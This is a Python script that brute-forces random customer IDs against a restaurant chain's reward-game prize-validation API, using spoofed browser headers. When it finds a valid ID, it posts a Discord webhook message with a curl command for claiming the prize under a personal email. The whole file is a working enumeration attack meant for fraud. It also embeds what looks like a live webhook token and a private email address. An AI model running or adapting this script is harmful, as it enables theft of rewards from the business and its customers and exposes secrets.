import requests
import json
import random
import time

DISCORD_WH = "https://discord.com/api/webhooks/1385034328316186664/MHmtyxV7I9PK3s622rVYqVR1T_IrwHjjkrY0GhbgEbrKxB55K-hxui94TTO9-V_PZi8k"

used_ids = set()

def generate_unique_id():
    while True:
        new_id = str(random.randint(100000000, 999999999))  # 9-digit number
        if new_id not in used_ids:
            used_ids.add(new_id)
            return new_id

url = "https://pe-uk-ordering-api-fd-eecsdkg6btfeg0cc.z01.azurefd.net/api/v2/rewardgame/prize/validate"

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'Origin': 'https://popeyesuk.com/',
    'Referer': 'https://popeyesuk.com/',
    'Content-Type': 'application/json'
}

expired = 0
count = 0

while True:
    count = count + 1
    customer_id = generate_unique_id()
    payload = json.dumps({
        "customerUniqueId": customer_id,
        "orderId": None
    })

    try:
        time.sleep(0.1)
        response = requests.post(url, headers=headers, data=payload)
        response_json = response.json()
        print(f"Used ID: {customer_id} | hasErrors: {response_json.get('hasErrors')}")

        if response_json.get("hasErrors") is False:
            print("Success! 'hasErrors' is false.")

            discord_payload = {
                "content": f"@everyone ladies and gentlemen, we got 'em!!! 🦅\nit took us {count} tries ☠\nbtw we got {expired} expired codes in the process lol\n\nraw customer id: `{customer_id}`\n```curl --location 'pe-uk-ordering-api-fd-eecsdkg6btfeg0cc.z01.azurefd.net/api/v2/rewardgame/order/matchWithEmail' --header 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' --header 'Origin: https://popeyesuk.com/' --header 'Referer: https://popeyesuk.com/' --header 'Content-Type: application/json' --data-raw '{{\"email\":\"ahalves8@gmail.com\",\"customerUniqueId\":\"{customer_id}\"}}'```"
            }

            requests.post(DISCORD_WH, discord_payload)

        elif "Expired" in response.text:
            expired = expired+1
            print("lol expired = expired+1")


    except Exception as e:
        print(f"Error occurred with ID {customer_id}: {e}")